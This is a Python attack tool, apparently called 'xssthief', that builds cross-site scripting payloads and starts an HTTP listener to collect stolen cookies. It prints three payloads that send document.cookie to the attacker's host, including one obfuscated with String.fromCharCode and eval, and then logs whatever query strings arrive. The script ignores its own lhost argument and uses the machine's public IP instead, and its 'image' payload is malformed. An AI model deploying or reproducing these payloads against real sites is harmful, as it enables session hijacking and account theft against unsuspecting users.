#!/usr/bin/python3

import argparse
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from requests import *
ip = get('https://api.ipify.org').text

parser = argparse.ArgumentParser(description='creates xss payloads and starts http server to capture responses and collect cookies', epilog='xssthief --error 10.10.10.50' + '\n' + 'xssthief --image 10.10.10.50' + '\n' + 'xssthief --obfuscated 10.10.10.50', formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('lhost', help='ip address of listening host')
parser.add_argument('-e', '--error', action='store_true', help='create error payload')
parser.add_argument('-i', '--image', action='store_true', help='create image payload')
parser.add_argument('-o', '--obfuscated', action='store_true', help='create obfuscated payload')
args = parser.parse_args()

lhost = ip

class handler(BaseHTTPRequestHandler):
        def do_GET(self):
                qs = {}
                path = self.path
                if '?' in path:
                        path, temp = path.split('?', 1)
                        qs = parse_qs(temp)
                print(qs)

def serve():
        print('Starting server, press Ctrl+C to exit...\n')
        address = (lhost, 80)
        httpd = HTTPServer(address, handler)
        try:
                httpd.serve_forever()
        except KeyboardInterrupt:
                httpd.server_close()
                print('\nBye!')

def obfuscate():
        js = '''document.write('<img src=x onerror=this.src="http://''' + lhost + '''/?cookie="+encodeURI(document.getElementsByName("cookie")[0].value)>');'''
        ords = ','.join([str(ord(c)) for c in js])
        payload = '<img src="/><script>eval(String.fromCharCode(' + ords + '))</script>" />'
        return payload

def err_payload():
	xss = '''<img src=x onerror=this.src='http://''' + lhost + '''/?cookie='+document.cookie>'''
	print('[*] Your payload: ' + xss + '\n')
	serve()

def img_payload():
	xss = '''<new Image().src='http://''' + lhost + '''/?cookie='+document.cookie>'''
	print('[*] Your payload: ' + xss + '\n')
	serve()

def obs_payload():
        xss = obfuscate()
        print('[*] Your payload: ' + xss + '\n')
        serve()

def main():
	if args.obfuscated:
		obs_payload()
	elif args.error:
		err_payload()
	elif args.image:
		img_payload()
	else:
		parser.print_help()

main()
